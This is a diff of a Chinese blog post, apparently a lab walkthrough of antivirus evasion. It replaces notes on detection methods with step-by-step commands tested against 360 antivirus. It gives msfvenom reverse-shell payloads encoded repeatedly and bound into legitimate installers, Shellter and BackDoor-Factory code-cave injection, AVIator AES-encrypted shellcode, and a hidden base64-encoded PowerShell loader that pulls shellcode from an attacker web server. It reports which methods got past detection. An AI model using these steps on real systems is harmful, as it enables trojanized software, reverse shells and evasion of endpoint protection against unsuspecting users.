-<h3 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h3><ol>
-<li>内存监控：发现内存中存在病毒并主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存中的网络数据</li>
-<li>文件监控：发现写到磁盘上的文件中存在病毒或者被病毒感染，主动报警</li>
-<li>邮件监控：电子邮件的附件中存在病毒时进行拦截</li>
-<li>网页防护：阻止网络攻击和不安全的下载行为</li>
-<li>行为防护：警示用户应用程序的可疑行为</li>
-</ol>
-<h3 id="扫描引擎"><a href="#扫描引擎" class="headerlink" title="扫描引擎"></a>扫描引擎</h3><h4 id="特征码扫描"><a href="#特征码扫描" class="headerlink" title="特征码扫描"></a>特征码扫描</h4><p>特征码扫描是传统杀毒软件的主要利器，是病毒诊断方法中，扫描法的一种。将扫描信息与病毒特征库进行对照，信息与病毒特征吻合的文件会被判断为存在病毒。病毒的特征码一般是文件内部的一段或者几段代码，特殊性在于不大可能与正常程序代码吻合。抽取的代码长度要适当，保证特征码唯一性的同时缩减病毒扫描的空间与时间开销</p>
+<h2 id="msf自带免杀"><a href="#msf自带免杀" class="headerlink" title="msf自带免杀"></a>msf自带免杀</h2><h3 id="原始payload"><a href="#原始payload" class="headerlink" title="原始payload"></a>原始payload</h3><p>直接用msfvenom生成原始payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -f exe -o payload1.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210193805172.png" alt="image-20220210193805172"></p>
+<p>360静态动态均可查杀</p>
+<h3 id="编码处理"><a href="#编码处理" class="headerlink" title="编码处理"></a>编码处理</h3><p>评级最⾼的两个encoder为<code>cmd/powershell_base64</code>和 <code>x86/shikata_ga_nai</code></p>
+<p>编码次数为15并去掉空字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15 -f exe -o payload2.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210201725861.png" alt="image-20220210201725861"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210201847245.png" alt="image-20220210201847245"></p>
+<p>360静态动态均可查杀</p>
+<h3 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h3><p>使用msfvenom中的<code>-x</code>参数可以指定一个可执行文件作为模板，将payload嵌入其中，<code>-x</code> 指定文件路径</p>
+<p>我这里捆绑的是360安全卫士</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -x 360Safe.exe -f exe -o payload3.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210202657179.png" alt="image-20220210202657179"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210202821265.png" alt="image-20220210202821265"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210202853855.png" alt="image-20220210202853855"></p>
+<p>360安全卫士静态没扫出来，360杀毒静态查杀，动态均查杀</p>
+<h3 id="捆绑-编码"><a href="#捆绑-编码" class="headerlink" title="捆绑+编码"></a>捆绑+编码</h3><p>上面两种方法的结合</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -e x86/shikata_ga_nai -x 360Safe.exe -i 15 -f exe -o payload4.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203326937.png" alt="image-20220210203326937"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203539659.png" alt="image-20220210203539659"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203553483.png" alt="image-20220210203553483"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203627448.png" alt="image-20220210203627448"></p>
+<p>360全家桶静态均可过，动态均查杀</p>
+<h3 id="多重编码-捆绑"><a href="#多重编码-捆绑" class="headerlink" title="多重编码+捆绑"></a>多重编码+捆绑</h3><p>通过管道符，让msfvenom用不同的编码器反复进行编码混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.221.128 LPORT=4444 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 10 -x 360Safe.exe -f exe &gt; payload5.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210205818844.png" alt="image-20220210205818844"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210205930063.png" alt="image-20220210205930063"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210210357725.png" alt="image-20220210210357725"></p>
+<p>360全家桶完全没反应？！</p>
+<h3 id="Evasion模块"><a href="#Evasion模块" class="headerlink" title="Evasion模块"></a>Evasion模块</h3><p>metasploit 5.0引入的一个新模块</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211154339417.png" alt="image-20220211154339417"></p>
+<h4 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use evasion/windows/windows_defender_exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload6.exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set lhost 192.168.221.128</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set lport 4444</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211154547017.png" alt="image-20220211154547017"></p>
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -H 192.168.221.128 -P 4444 -p windows/meterpreter/reverse_tcp</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211154144937.png" alt="image-20220211154144937"></p>
+<p>还没扫描就被删除了</p>
+<h4 id="hta"><a href="#hta" class="headerlink" title="hta"></a>hta</h4><p>用<code>evasion/windows/windows_defender_js_hta</code>模块生成payload</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211155757515.png" alt="image-20220211155757515"></p>
+<p>360杀毒静态可查杀</p>
+<h4 id="install-util"><a href="#install-util" class="headerlink" title="install_util"></a>install_util</h4><p>用<code>evasion/windows/applocker_evasion_install_util</code>模块生成payload</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211171158049.png" alt="image-20220211171158049"></p>
+<p>使用<code>csc.exe</code>进行编译后用<code>InstallUtil.exe</code>加载文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211170422141.png" alt="image-20220211170422141"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>
+
+<p>360动态可查杀</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>MSF在被各大安全厂商盯这么紧的情况下，<code>多重编码＋捆绑</code>的方式能免杀成功还是出乎意料的</p>
+<h2 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a>Veil</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>为了方便直接拉取veil镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
+
+<p>拉取成功，执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
+
+<p>将Kali的<code>/tmp/veil-output</code>目录映射到docker里面，这样Veil生成的payload可以直接在kali里使用</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>Veil有两个免杀工具，Evasion和Ordnance</p>
+<p>Evasion用做文件免杀</p>
+<p>Ordnance生成在Veil-Evasion中使用的shellcode</p>
+<h3 id="exe-1"><a href="#exe-1" class="headerlink" title="exe"></a>exe</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 1                         //选择Evasionlist                          //查看payload列表use 16                        //go语言生成msf的payloadset lhost 192.168.221.128     set lport 4445generatego_msf                        //生成的payload名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211173556181.png" alt="image-20220211173556181"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211174519477.png" alt="image-20220211174519477"></p>
+<p>360静态动态均可查杀</p>
+<h3 id="Veil-mingw-w64"><a href="#Veil-mingw-w64" class="headerlink" title="Veil+mingw-w64"></a>Veil+mingw-w64</h3><p>（待补）</p>
+<h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>（安装出问题，待补）</p>
+<h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>某些版本的Kali自带，没有的可以自行安装，安装过程中不会出现特别坑爹的问题，比较友好</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install shellter</span><br></pre></td></tr></table></figure>
+
+<p>运行报错，有提示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br></pre></td></tr></table></figure>
+
+<p>安装完毕</p>
+<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>准备一个pe文件<code>npp.exe</code>，之后Shellter会备份该pe文件，因为生成的payload会覆盖原来的<code>npp.exe</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211210737098.png" alt="image-20220211210737098"></p>
+<p>接下来根据情况来选择即可，我选的<code>windows/meterpreter/reverse_tcp</code></p>
+<p>中间有个<code>Enable Stealth Mode</code>，是否使用隐身模式，特意做了两种来尝试</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211195832317.png" alt="image-20220211195832317"></p>
+<p>选择隐身模式生成的payload执行后被查杀</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211210316878.png" alt="image-20220211210316878"></p>
+<p>选择非隐身模式生成的payload，成功绕过360！</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211211221212.png" alt="image-20220211211221212"></p>
+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>Shellter使用方便，免杀效果不错。第一次用<code>360Safe.exe</code>生成的payload一直没法监听成功也没有被查杀。搜索了下得用32位的，改用老版本<code>notepad++</code>的安装程序，成功收到meterpreter，对于为啥选择非隐身能绕过360还是不太懂</p>
+<h2 id="BackDoor-Factory"><a href="#BackDoor-Factory" class="headerlink" title="BackDoor-Factory"></a>BackDoor-Factory</h2><p>用户可以在不破坏原有可执行文件的功能的前提下，在文件的代码裂隙中插入shellcode，支持自定义shellcode</p>
+<h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>直接拉取docker镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull secretsquirrel/the-backdoor-factory</span><br><span class="line">docker run -it secretsquirrel/the-backdoor-factory bash</span><br><span class="line"># ./backdoor.py</span><br></pre></td></tr></table></figure>
+
+<p>运行成功</p>
+<h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -v /root/test:/root/payload:z secretsquirrel/the-backdoor-factory</span><br></pre></td></tr></table></figure>
+
+<p>跟Veil使用相似，进行文件夹映射</p>
+<h4 id="程序测试"><a href="#程序测试" class="headerlink" title="程序测试"></a>程序测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -S</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串</p>
+<p>-f: 指定被测试程序</p>
+<p>-S: 检查程序是否可被利用</p>
 </blockquote>
-<p><strong>特征码类别：</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212125645235.png" alt="image-20220212125645235"></p>
+<p>检查exe是否能插入shellcode</p>
+<h4 id="搜索Code-Caves"><a href="#搜索Code-Caves" class="headerlink" title="搜索Code Caves"></a>搜索Code Caves</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -c -l 600</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-c: 查找Code Cave</p>
+<p>-l: Code Cave Size，用于插入shellcode</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212130536451.png" alt="image-20220212130536451"></p>
+<p>找到了5个可利用点</p>
+<h4 id="获取payload"><a href="#获取payload" class="headerlink" title="获取payload"></a>获取payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -s -show</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212130803057.png" alt="image-20220212130803057"></p>
+<blockquote>
 <ol>
-<li>文件特征码：单一文件特征码、复合文件特征码（通过多处特征进行判断）。针对<strong>文件病毒</strong></li>
-<li>内存特征码：单一内存特征码、复合内存特征码。针对<strong>内存病毒</strong></li>
+<li>reverse_shell_tcp_inline ：对应msf： use exploit/multi/handlerset</li>
 </ol>
-<p>优点：速度快；准确率相对较高，误杀操作较少；基本不需要用户参与判断</p>
-<p>缺点：采用病毒特征代码检测，面对不断出现的新型病毒需要不断更新病毒库，否则检测工具的老化会失去使用价值；病毒特征代码检测无法对不知道特征码的新病毒进行检测；病毒特征码本身有问题可能会出现误报，数据误删</p>
-<h4 id="文件校验和"><a href="#文件校验和" class="headerlink" title="文件校验和"></a>文件校验和</h4><p>对文件扫描后，计算正常文件内容的校验和，将校验和写入文件中或写入别的文件保存；定期或每次在使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，从而判断文件是否被感染</p>
-<p>优点：方法简单；可发现未知病毒；能发现文件细微变化</p>
-<p>缺点：误报率高；效率低；不能识别病毒</p>
-<h4 id="行为检测"><a href="#行为检测" class="headerlink" title="行为检测"></a>行为检测</h4><p>通过长期观察研究总结病毒的特殊行为，并且这些行为在正常程序行为中比较罕见。当程序运行时，监视进程的各种行为，发现病毒行为，立即报警。</p>
-<p>优点：可发现未知病毒；可准确预报未知的大多病毒</p>
-<p>缺点：可能误报；不能识别病毒；需要用户参与判断</p>
-<h4 id="主动防御"><a href="#主动防御" class="headerlink" title="主动防御"></a>主动防御</h4><p>不需要病毒特征码支持，杀软自行分析扫描目标程序的行为，根据预先设定的规则进行主动的病毒判断清除等操作。</p>
-<p>实现难度较高，计算机智能也是在一系列规则下诞生的，该技术还需要不断的研究进步</p>
-<h4 id="机器学习识别"><a href="#机器学习识别" class="headerlink" title="机器学习识别"></a>机器学习识别</h4><p>既可以做静态样本的二进制分析，又可以运行在沙箱动态行为分析中，内容/行为+算法模式。随着深度学习的发展，运用深度学习技术来识别病毒特征</p>
-<h2 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h2><p>免杀技术最基本思想就是破坏病毒木马本身的特征，可以是特征码，也可以是行为特征，破坏其固有特征并保留其原有功能</p>
-<h3 id="修改特征码"><a href="#修改特征码" class="headerlink" title="修改特征码"></a>修改特征码</h3><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>特征码定位到数据位置不容易修改</p>
+<p>payload windows/meterpreter/reverse_tcp</p>
+<ol start="2">
+<li>meterpreter_reverse_https_threaded ：对应msf： use</li>
+</ol>
+<p>exploit/multi/handlerset payload windows/meterpreter/reverse_https</p>
+<ol start="3">
+<li>iat_reverse_tcp_inline : 增加了修复IAT的功能，避免reverse_shell_tcp_inline执⾏失败</li>
+<li>iat_reverse_tcp_stager_threaded : 功能类似上一条</li>
+<li>user_supplied_shellcode_threaded ：对应的msf： use</li>
+</ol>
+<p>exploit/multi/handlerset payload windows/meterpreter/reverse_tcp``⾃定义</p>
+<p>shellcode</p>
+</blockquote>
+<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -s iat_reverse_tcp_stager_threaded -H 192.168.221.128 -P 4444 -J -o payload8.exe</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-J: 选择多个Code Cave注入 </p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212140152504.png" alt="image-20220212140152504"></p>
+<p>360动静态均可查杀</p>
+<h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>缝隙插入代码的想法比较有意思，但是免杀效果经测试不太行</p>
+<h2 id="Avet"><a href="#Avet" class="headerlink" title="Avet"></a>Avet</h2><p>（装了近3个小时没法用，心态崩了）</p>
+<h2 id="TheFatRat"><a href="#TheFatRat" class="headerlink" title="TheFatRat"></a>TheFatRat</h2><p>（待补）</p>
+<h2 id="Avoidz"><a href="#Avoidz" class="headerlink" title="Avoidz"></a>Avoidz</h2><p>（安装出错，待补）</p>
+<h2 id="Green-Hat-Suite"><a href="#Green-Hat-Suite" class="headerlink" title="Green-Hat-Suite"></a>Green-Hat-Suite</h2><p>（待补）</p>
+<h2 id="zirikatu"><a href="#zirikatu" class="headerlink" title="zirikatu"></a>zirikatu</h2><p>zirikatu利用msfvenom生成shellcode，再进行后续处理并生成exe</p>
+<h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x zirikatu.sh</span><br><span class="line">./zirikatu.sh</span><br></pre></td></tr></table></figure>
+
+<p>运行成功</p>
+<h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212180240192.png" alt="image-20220212180240192"></p>
+<p>zirikatu可以修改图标，增加错误提示，监听等功能</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212180215659.png" alt="image-20220212180215659"></p>
+<p>360静态可查杀</p>
+<h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><p>网上看到的文章中这个操作简单体量小的工具居然能免杀360火绒，测试后静态查杀就翻车了，这个工具也挺老了后续没有更新，可惜</p>
+<h2 id="AVIator"><a href="#AVIator" class="headerlink" title="AVIator"></a>AVIator</h2><p>AVIator使⽤AES加密来加密给定的Shellcode加密，⽣成⼀个包含加密有效负载的可</p>
+<p>执⾏⽂件，然后使⽤各种注⼊技术将shellcode解密并注⼊到⽬标系统，从⽽绕过杀</p>
+<p>毒软件的检测</p>
+<p>只支持windows，C#开发</p>
+<h3 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h3><p>直接下载压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Ch0pin/AVIator</span><br></pre></td></tr></table></figure>
+
+<p>解压运行exe即可</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212181426434.png" alt="image-20220212181426434"></p>
+<h3 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h3><p>用msf生成基于C#的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f csharp -o payload11.c</span><br></pre></td></tr></table></figure>
+
+<p>复制<code>payload11.c</code>中{}内的内容到payload，加密生成新payload</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212182138145.png" alt="image-20220212182138145"></p>
+<p><code>Select path</code>选择存放路径</p>
+<p><code>Injection Techniques</code>选择注入技术，这里用了第二个注入Notepad++</p>
+<p><code>Generate Exe</code>生成可执行文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212183258116.png" alt="image-20220212183258116"></p>
+<p>360全家桶第一次静态查杀没有反应，但是过了一会就被360杀毒删除隔离了</p>
+<p>动态直接被查杀</p>
+<h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3><p>工具简单，使用便捷。免杀效果不如以前了，作者官方说明文件中也说了，随着工具的流行，工具也长期没有更新，效果确实越来越差了。但是作者提出了一种思路，就是对生成的可执行文件使用C#混淆器，后续可以尝试下</p>
+<h2 id="DKMC"><a href="#DKMC" class="headerlink" title="DKMC"></a>DKMC</h2><p>DKMC是⼀种⽣成混淆的shellcode的⼯具，并把shellcode合成到图像⽂件中，最终依靠PowerShell执⾏最终的shellcode</p>
+<h3 id="安装-5"><a href="#安装-5" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Mr-Un1k0d3r/DKMC</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-5"><a href="#使用-5" class="headerlink" title="使用"></a>使用</h3><p><code>python dkmc.py</code>运行DKMC，参数解释</p>
+<blockquote>
+<p>[*] (gen) 将msf的shellcode注入到一个BMP图像</p>
+<p>[*] (web) 启动web服务用来分发BMP图像</p>
+<p>[*] (ps) 生成ps的payload</p>
+<p>[*] (sc) 将msf生成的raw文件转为shellcode</p>
+<p>[*] (exit) 退出</p>
+</blockquote>
+<p>执行流程如下：</p>
 <ol>
-<li>字符串，如果不影响程序逻辑，可替换大小写；无关紧要的数据，随意替换</li>
-<li>整数，如果不影响结果，可替换值或清零等</li>
-<li>地址，基本不能修改，具体看情况</li>
-<li>PE头数据，无用数据清零或修改，有用数据具体情况具体分析</li>
-<li>直接修改代码访问数据的地址，数据放到其他地址</li>
+<li>用msf生成raw文件</li>
+<li>将msf生成的raw文件转为shellcode</li>
+<li>将shellcode注入到BMP图像中</li>
+<li>生成powershell payload</li>
+<li>用web服务分发BMP文件</li>
 </ol>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>特征码定位到代码</p>
+<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 -f raw -o /root/桌面/payload/payload12.raw</span><br></pre></td></tr></table></figure>
+
+<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p><code>sc</code>设置``source为上一步生成的<code>payload12.raw</code>，生成shellcode，复制并<code>exit</code>返回主菜单</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212202336610.png" alt="image-20220212202336610"></p>
+<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p><code>gen</code>设置shellcode为上一步中复制的内容，生成bmp并<code>exit</code>返回主菜单</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212202635077.png" alt="image-20220212202635077"></p>
+<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p><code>ps</code>设置url为Kali地址，执行生成powershell脚本，复制脚本并<code>exit</code>返回主菜单</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212203218057.png" alt="image-20220212203218057"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-enc</span> JABIAGEAcABiAEwAUgB0AFQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBDAEcAdQBvAEIAMgBJAEMALwB6AEUAMgBOAEQAUQAyAE4AagBrAHcATQB6AFUAdQBNAHoAWQAhAHYAVgBaAGQAVAArAE0ANABGAEgAMQBIADQAagA5AFkAbwAwAGgASgBwAEQAUwAwAEIAYgBFAHMAMABrAGkAVQBGAG8AYQBPAEsASABRAEkAUQA5AEYAMABxAHAARwBiADMARABZAGUAbgBEAGcANABUAHEARQBNAC8AUABlADkAegBnAGMAcABvAHUAeQB3AHUAOQBMAG0ASgBZAGwAOQByADMAMQA5AHoAdgBHAHgAagBTAC8AegBIAHIAMABtAEgAOABtAEIAdQBiAGsAeAB5ADIASgBmAE0AUgBHAFQAVwArADkAYQBmAGcAdABaAGQARQBwACsAYgBXADYAUQA4AGgAbABTAFMAUwBOAGkARwBRAHMAcQBmADAAUQBpAHkARABnADQASgBQADkASgBwAFAAIQBoAHkAQwBUAFkAZABiACEAeABEAFUALwBTADYAeABnAEgAdABzAGEAZABKAE8AbQBKAGkATABKADQAcwByAC8AZgB6AGEAUwBFAFcAQgBYAC8ANwBpAGQAUQBuAFQAUwBGAGEATQBvAFoAcABKAFoATgBIAHMAawBvAEIAIQBtAE4AOAArAGwAUAA4AEIAWAA1AFIAWQB3AGYANwBpAGMAdQBwAHAAUwBYAFkAYwBzAHUAOQBVAE0AZwBqAFUANABjADYATAA1AFQANABWAE4AZABzAE8AcwBsAG4AQwBuAEwALwBQADcAZAB0AE0AZQBOADEAcwBRADkAdQBzADAAbwBUAHkAMwBUAFcANgBZAEsASQBqAGYAZwAzAEwAVABKAGsANgAwAG4AdgBGAHcAbQBZAEoAawBEADUAawB1AFIAaQBwAGwAeQBSAHkAegBlAGIAcgB0AGYANAA1AFQATwA0ACEAeABIAFcAOAAhACEAVgBDAGkAQwAxAE0AVABsADEAIQB1AFMAbwBEAEkAWgBWACsAdgBTACEAeABWAGgAbABvAG0AZgBRADAAUwBnAEUAdwBRAFMAVQBzAHgAeQArAC8ARgBDADMASQBCAGwAeABCAG4AbgBEAGoAbQB3AHgAbQBVAFYARgAxAG0AcwBXACEAVABZAHIAMABDAEsAeAAhAE8ANQBZAEQANgBrADcAZwBtAE4AIQB3ADQAWABNAEoAdABZAFoAMwBCAFgATABmADYAOQBTAGQAWgBxAEUAawBZAE4AbABiAFEAZABwAEcAbAB0AG8AWQBPAGMAdAB5AEwAWAB0AEYAKwBYAHUAawBLAHUAagBjADgAcgBnAGgARwBTAEoANAAzAEsAcwAxAEwARQBSAFQAYQBhAHIAVgBGAEoAMwBWACEAOQA0ADcAdwBIAGMAQgBYAFcAVQBLAFEAcwB6AC8ANQBJAG0AZwA0AFoAWQBEAFYAVQBDAGIAbgBFAFgAKwBOAFMAWgBtAEIAUAB5AEYAaQB6AE4ASgA1AE0AaQBEAEcANgBTAHYAeABoADcAMwB3ADUAYwB0ADQANwBaAEsAdgBLAHgAKwB4AFkAZgAhAG0AeABhAFgAdwBsAFcARABDAHAAQgAzAGoAQgByAEsARQBZADEAegBGAHYAeQA3AFEASABNAHgAWgBEAGIAeABuAFQAaQBQAG0AVgBFAHEAMQAxAFoATQBHAE0AUQB3ADYATQBXADQAVwBkAFkAWQBHAFcAVwBYAFoAIQAwACEATQBPAGMANgBvADAAKwAhADQAWgB2ADAANAA3AGkAcABoADYAegBqADMATQBHACEAOQAhAGQAbgB3AGsAUABNAFcAcQBVACEAdgAyAHkAMgBJAEsAUABpADIAegBIAHcAOABnAFEAZwBpAEwAZgB4AE4ANQBtADYASAArAG8AWQBvAHUATgBiACsAcwBaAHQAZgAvAEcARwBSADIATwBVADEAVABoAHcAdwB6ADMASQBDACsAUQB6AHkAZwBIACEASwBIAGQATwBLAFUAbABWADIAZABUAEkAbgA4ADAANgB6AEwASABXAFIAYwBNAFoAKwBtAHEAaABwAHUAWQByADkARQBzADUAeQAxAEsAKwBKAFUAeQBjAHgASABiAGgARwBCAFMAeQA4AEI